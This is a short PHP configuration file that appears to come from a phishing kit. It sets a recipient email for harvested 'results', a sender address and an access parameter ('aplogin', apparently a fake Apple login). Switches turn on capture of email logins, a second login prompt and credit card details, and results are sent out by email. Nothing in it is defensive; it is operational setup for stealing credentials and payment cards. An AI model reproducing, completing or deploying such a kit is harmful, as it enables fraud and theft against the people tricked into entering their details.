<?php
$config = array(
    'email_result' => 'youremail@domain.com', //Email Result
    'sender_mail' => 'admin@spm55.com', //Sender email
    'site_parameter' => 'aplogin', //Parameter Access
    'site_param_on' => 'on', //Setting parameter (on/off)
    'get_email' => 'on', //Get Email Access (on/off)
    'two_login' => 'on', //Double Login (on/off)
    'two_cc' => 'on', //Double Credit Card (on/off)
    'get_cc' => 'on', //Get Credit Card (on/off)
    'get_pap' => 'off', //Get Credit Card (on/off)
    'send_login' => 'email' //Send result using (email/server)
);
$param_akses = $config['site_parameter'];
$result_anying = $config['email_result'];
$sentod = $config['sender_mail'];
$random = rand(1, 100);
?>